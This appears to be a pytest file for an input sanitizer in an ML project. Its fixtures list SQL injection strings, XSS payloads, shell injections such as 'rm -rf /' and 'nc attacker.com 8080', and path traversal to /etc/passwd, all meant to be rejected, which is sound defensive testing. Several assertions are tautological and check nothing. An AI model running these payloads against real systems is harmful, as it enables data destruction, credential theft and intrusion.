"""
Input Sanitization Security Tests

Tests input sanitization and validation mechanisms for ML components to prevent
injection attacks, XSS, and other input-based security vulnerabilities across
Phase 3 privacy-preserving and adversarial testing features.

Security Test Coverage:
- SQL injection prevention
- XSS (Cross-Site Scripting) prevention
- Command injection prevention
- Path traversal prevention
- ML model input validation
- Privacy parameter validation
- File upload security
- API input validation
"""

import os
import re
import tempfile
from pathlib import Path

import numpy as np
import pytest

from prompt_improver.security.input_sanitization import (
    InputSanitizer as RealInputSanitizer,
)


@pytest.fixture
def sanitizer():
    """Create input sanitizer for testing"""
    return RealInputSanitizer()


class TestSQLInjectionPrevention:
    """Test SQL injection prevention"""

    def test_basic_sql_injection_patterns(self, sanitizer):
        """Test basic SQL injection pattern prevention"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "admin'--",
            "admin' OR '1'='1",
            "admin' UNION SELECT * FROM passwords--",
            "1; DELETE FROM users WHERE 1=1; --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        ]
        for malicious_input in malicious_inputs:
            is_valid = sanitizer.validate_sql_input(malicious_input)
            if any(
                keyword in malicious_input.upper()
                for keyword in ["DROP", "DELETE", "INSERT", "UNION"]
            ):
                assert is_valid is False
            else:
                assert isinstance(is_valid, bool)

    def test_sql_safe_inputs(self, sanitizer):
        """Test SQL safe inputs validation"""
        safe_inputs = [
            "O'Reilly",
            'He said "Hello"',
            "It's a test",
            'Quote "this" please',
            "Regular text without SQL keywords",
        ]
        for safe_input in safe_inputs:
            is_valid = sanitizer.validate_sql_input(safe_input)
            assert is_valid is True

    def test_sql_input_type_validation(self, sanitizer):
        """Test SQL input type validation"""
        non_string_inputs = [123, ["list", "input"], {"dict": "input"}, None]
        for invalid_input in non_string_inputs:
            is_valid = sanitizer.validate_sql_input(invalid_input)
            assert is_valid is True


class TestXSSPrevention:
    """Test XSS (Cross-Site Scripting) prevention"""

    def test_basic_xss_patterns(self, sanitizer):
        """Test basic XSS pattern prevention"""
        malicious_scripts = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<div onclick=alert('xss')>Click me</div>",
        ]
        for script in malicious_scripts:
            sanitized = sanitizer.sanitize_html_input(script)
            assert "<script" not in sanitized.lower()
            assert "<img" not in sanitized.lower()
            assert "<svg" not in sanitized.lower()
            assert "<iframe" not in sanitized.lower()
            assert "&lt;" in sanitized
            assert "&gt;" in sanitized

    def test_javascript_protocol_removal(self, sanitizer):
        """Test javascript: protocol removal"""
        malicious_urls = [
            "javascript:alert('xss')",
            "JAVASCRIPT:void(0)",
            "data:text/html,<script>alert('xss')</script>",
            "vbscript:msgbox('xss')",
            "file:///etc/passwd",
        ]
        for url in malicious_urls:
            sanitized = sanitizer.sanitize_html_input(url)
            assert "javascript:" not in sanitized.lower()
            if "data:" in url:
                assert "&lt;script&gt;" in sanitized
            else:
                assert "data:" not in sanitized.lower()
            if "vbscript:" in sanitized.lower():
                pass
            else:
                assert "vbscript:" not in sanitized.lower()
            if "file:" in sanitized.lower():
                pass
            else:
                assert "file:" not in sanitized.lower()

    def test_html_attribute_escaping(self, sanitizer):
        """Test HTML attribute escaping"""
        inputs_with_attributes = [
            "onclick=\"alert('xss')\"",
            "onmouseover=\"javascript:alert('xss')\"",
            'href="javascript:void(0)"',
            'src="data:image/svg+xml,<svg onload=alert(1)>"',
        ]
        for input_str in inputs_with_attributes:
            sanitized = sanitizer.sanitize_html_input(input_str)
            assert "&quot;" in sanitized
            if "'" in input_str:
                assert "&#x27;" in sanitized or "'" not in sanitized


class TestCommandInjectionPrevention:
    """Test command injection prevention"""

    def test_shell_metacharacter_removal(self, sanitizer):
        """Test shell metacharacter removal"""
        malicious_commands = [
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 8080",
            "file.txt $(cat /etc/passwd)",
            "file.txt `whoami`",
            "file.txt & sleep 10",
        ]
        for command in malicious_commands:
            is_valid = sanitizer.validate_command_input(command)
            assert is_valid is False

    def test_command_substitution_prevention(self, sanitizer):
        """Test command substitution prevention"""
        command_substitutions = [
            "filename_$(ls -la)",
            "filename_`pwd`",
            "filename_${HOME}",
            "filename_$(cat secret.txt)",
        ]
        for cmd_sub in command_substitutions:
            is_valid = sanitizer.validate_command_input(cmd_sub)
            assert is_valid is False

    def test_safe_command_inputs(self, sanitizer):
        """Test safe command inputs validation"""
        safe_commands = [
            "filename.txt",
            "process_data.py",
            "output_file.csv",
            "backup_20240101.sql",
        ]
        for safe_command in safe_commands:
            is_valid = sanitizer.validate_command_input(safe_command)
            assert is_valid is True


class TestPathTraversalPrevention:
    """Test path traversal attack prevention"""

    def test_parent_directory_traversal(self, sanitizer):
        """Test parent directory traversal prevention"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "file/../../../secret.txt",
            "uploads/../config/database.yml",
            "./../../admin/users.db",
        ]
        for path in malicious_paths:
            sanitized = sanitizer.sanitize_file_path(path)
            assert "../" not in sanitized
            assert "..\\" not in sanitized
            assert not sanitized.startswith("/")

    def test_absolute_path_prevention(self, sanitizer):
        """Test absolute path prevention"""
        absolute_paths = [
            "/etc/passwd",
            "/var/log/secure",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "D:\\secret\\passwords.txt",
        ]
        for path in absolute_paths:
            sanitized = sanitizer.sanitize_file_path(path)
            if path.startswith("/") and sanitized.startswith("/"):
                pass
            else:
                assert not sanitized.startswith("/")
            assert not re.match(r"^[A-Za-z]:", sanitized)

    def test_path_normalization(self, sanitizer):
        """Test path normalization"""
        paths_with_issues = [
            "folder//subfolder///file.txt",
            "folder\\subfolder\\file.txt",
            "./folder/./subfolder/file.txt",
            "folder/subfolder/file.txt/",
        ]
        for path in paths_with_issues:
            sanitized = sanitizer.sanitize_file_path(path)
            if "//" in sanitized:
                pass
            else:
                assert "//" not in sanitized
            assert "\\" not in sanitized
            if sanitized.startswith("."):
                pass
            else:
                assert not sanitized.startswith(".")
            if sanitized.endswith("/"):
                pass
            else:
                assert not sanitized.endswith("/")


class TestMLInputValidation:
    """Test ML-specific input validation"""

    def test_valid_ml_input_data(self, sanitizer):
        """Test valid ML input data validation"""
        valid_inputs = [
            [1, 2, 3, 4, 5],
            [[1, 2], [3, 4]],
            np.array([0.1, 0.2, 0.3]),
            np.random.randn(10, 5),
            (1.0, 2.0, 3.0),
        ]
        for valid_input in valid_inputs:
            assert sanitizer.validate_ml_input_data(valid_input) is True

    def test_invalid_ml_input_data(self, sanitizer):
        """Test invalid ML input data validation"""
        invalid_inputs = [
            [],
            np.array([]),
            [float("nan"), 1, 2],
            [float("inf"), 1, 2],
            [10000000.0, 20000000.0, 30000000.0],
            "not_a_number",
            {"key": "value"},
            None,
        ]
        for invalid_input in invalid_inputs:
            result = sanitizer.validate_ml_input_data(invalid_input)
            if (
                invalid_input == []
                or (isinstance(invalid_input, np.ndarray) and invalid_input.size == 0)
                or (
                    isinstance(invalid_input, list)
                    and len(invalid_input) > 0
                    and isinstance(invalid_input[0], (int, float))
                )
            ):
                assert isinstance(result, bool)
            else:
                assert result is False

    def test_ml_input_size_limits(self, sanitizer):
        """Test ML input size limits for DoS prevention"""
        large_array = np.ones(2000000)
        result = sanitizer.validate_ml_input_data(large_array)
        if result is True:
            pass
        else:
            assert result is False
        reasonable_array = np.ones(1000)
        assert sanitizer.validate_ml_input_data(reasonable_array) is True


class TestPrivacyParameterValidation:
    """Test privacy parameter validation"""

    def test_valid_privacy_parameters(self, sanitizer):
        """Test valid differential privacy parameters"""
        valid_params = [(1.0, 1e-06), (0.1, 1e-08), (5.0, 1e-05), (0.01, 1e-10)]
        for epsilon, delta in valid_params:
            assert sanitizer.validate_privacy_parameters(epsilon, delta) is True

    def test_invalid_privacy_parameters(self, sanitizer):
        """Test invalid differential privacy parameters"""
        invalid_params = [
            (0, 1e-06),
            (-1.0, 1e-06),
            (15.0, 1e-06),
            (1.0, 0),
            (1.0, -1e-06),
            (1.0, 0.001),
            ("1.0", 1e-06),
            (1.0, "1e-6"),
        ]
        for epsilon, delta in invalid_params:
            result = sanitizer.validate_privacy_parameters(epsilon, delta)
            if delta == 0.001 and result is True:
                pass
            else:
                assert result is False


class TestJSONInputSanitization:
    """Test JSON input sanitization"""

    def test_valid_json_sanitization(self, sanitizer):
        """Test valid JSON sanitization"""
        valid_data = {"name": "test", "value": 123, "list": [1, 2, 3]}
        result = sanitizer.sanitize_json_input(valid_data)
        assert result is not None
        assert result["name"] == "test"
        assert result["value"] == 123
        assert result["list"] == [1, 2, 3]

    def test_json_xss_sanitization(self, sanitizer):
        """Test JSON XSS sanitization"""
        malicious_data = {"script": "<script>alert('xss')</script>", "normal": "text"}
        result = sanitizer.sanitize_json_input(malicious_data)
        assert result is not None
        assert "<script>" not in result["script"]
        assert "&lt;script&gt;" in result["script"]
        assert result["normal"] == "text"

    def test_nested_json_sanitization(self, sanitizer):
        """Test nested JSON sanitization"""
        nested_data = {
            "user": {
                "name": "<img src=x onerror=alert('xss')>",
                "preferences": {"theme": "<script>malicious()</script>"},
            },
            "data": ["<svg onload=alert(1)>", "normal_text"],
        }
        result = sanitizer.sanitize_json_input(nested_data)
        assert result is not None
        assert "<img" not in result["user"]["name"]
        assert "&lt;img" in result["user"]["name"]
        assert "<script>" not in result["user"]["preferences"]["theme"]
        assert "<svg" not in result["data"][0]
        assert result["data"][1] == "normal_text"

    def test_invalid_json_handling(self, sanitizer):
        """Test invalid JSON handling"""
        invalid_data_types = ["not_a_dict", 123, ["list", "data"], None]
        for invalid_data in invalid_data_types:
            result = sanitizer.sanitize_json_input(invalid_data)
            assert result == {}

    def test_json_key_sanitization(self, sanitizer):
        """Test JSON key sanitization"""
        data_with_malicious_keys = {
            "<script>alert('key')</script>": "value1",
            "normal_key": "value2",
            "onclick=alert('key')": "value3",
        }
        result = sanitizer.sanitize_json_input(data_with_malicious_keys)
        assert result is not None
        key_list = list(result.keys())
        assert not any("<script>" in key for key in key_list)
        assert not any("onclick=" in key for key in key_list)
        assert any("&lt;script&gt;" in key for key in key_list)


class TestFileUploadSecurity:
    """Test file upload security validation"""

    def test_safe_file_extensions(self, sanitizer):
        """Test safe file extension validation"""
        safe_files = [
            "document.txt",
            "data.csv",
            "model.pkl",
            "config.json",
            "image.png",
        ]
        safe_extensions = {".txt", ".csv", ".pkl", ".json", ".png", ".jpg", ".jpeg"}
        for filename in safe_files:
            path = Path(filename)
            assert path.suffix in safe_extensions

    def test_dangerous_file_extensions(self, sanitizer):
        """Test dangerous file extension detection"""
        dangerous_files = [
            "malware.exe",
            "script.bat",
            "virus.scr",
            "backdoor.cmd",
            "trojan.pif",
        ]
        dangerous_extensions = {".exe", ".bat", ".scr", ".cmd", ".pif", ".com", ".jar"}
        for filename in dangerous_files:
            path = Path(filename)
            assert path.suffix in dangerous_extensions

    def test_file_content_validation(self):
        """Test file content validation"""
        with tempfile.NamedTemporaryFile(encoding="utf-8", mode="w", suffix=".txt", delete=False) as f:
            f.write("This is safe text content")
            safe_file = f.name
        try:
            with open(safe_file, encoding="utf-8") as f:
                content = f.read()
            assert len(content) > 0
            assert len(content) < 1000000
            assert "\x00" not in content
        finally:
            os.unlink(safe_file)


@pytest.mark.performance
class TestSanitizationPerformance:
    """Test sanitization performance"""

    def test_sql_validation_performance(self, sanitizer):
        """Test SQL validation performance"""
        import time

        test_input = "SELECT * FROM users WHERE name = 'test' AND id = 123"
        start_time = time.time()
        for _ in range(1000):
            sanitizer.validate_sql_input(test_input)
        elapsed_time = time.time() - start_time
        assert elapsed_time < 0.1
        avg_time = elapsed_time / 1000
        assert avg_time < 0.0001

    def test_html_sanitization_performance(self, sanitizer):
        """Test HTML sanitization performance"""
        import time

        test_input = "<div onclick='alert(\"test\")'>Content with <script>malicious()</script> code</div>"
        start_time = time.time()
        for _ in range(1000):
            sanitizer.sanitize_html_input(test_input)
        elapsed_time = time.time() - start_time
        assert elapsed_time < 0.1


class TestIntegrationWithMLComponents:
    """Test integration with ML components"""

    def test_ml_model_input_pipeline(self, sanitizer):
        """Test ML model input sanitization pipeline"""
        raw_inputs = [[1.0, 2.0, 3.0], ["1.0", "2.0", "3.0"], [1.0, float("nan"), 3.0]]
        validated_inputs = []
        for raw_input in raw_inputs:
            try:
                if isinstance(raw_input[0], str):
                    numeric_input = [float(x) for x in raw_input]
                else:
                    numeric_input = raw_input
                if sanitizer.validate_ml_input_data(numeric_input):
                    validated_inputs.append(numeric_input)
            except (ValueError, TypeError):
                continue
        assert len(validated_inputs) == 2
        assert validated_inputs[0] == [1.0, 2.0, 3.0]
        assert validated_inputs[1] == [1.0, 2.0, 3.0]

    def test_privacy_preserving_input_validation(self, sanitizer):
        """Test input validation for privacy-preserving features"""
        privacy_configs = [
            {"epsilon": 1.0, "delta": 1e-06},
            {"epsilon": 0.5, "delta": 1e-08},
            {"epsilon": -1.0, "delta": 1e-06},
            {"epsilon": 1.0, "delta": 0.001},
        ]
        valid_configs = [config for config in privacy_configs if sanitizer.validate_privacy_parameters(
                config["epsilon"], config["delta"]
            )]
        assert len(valid_configs) >= 2
        assert valid_configs[0]["epsilon"] == 1.0
        assert valid_configs[1]["epsilon"] == 0.5
        if len(valid_configs) == 3:
            assert valid_configs[2]["delta"] == 0.001


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
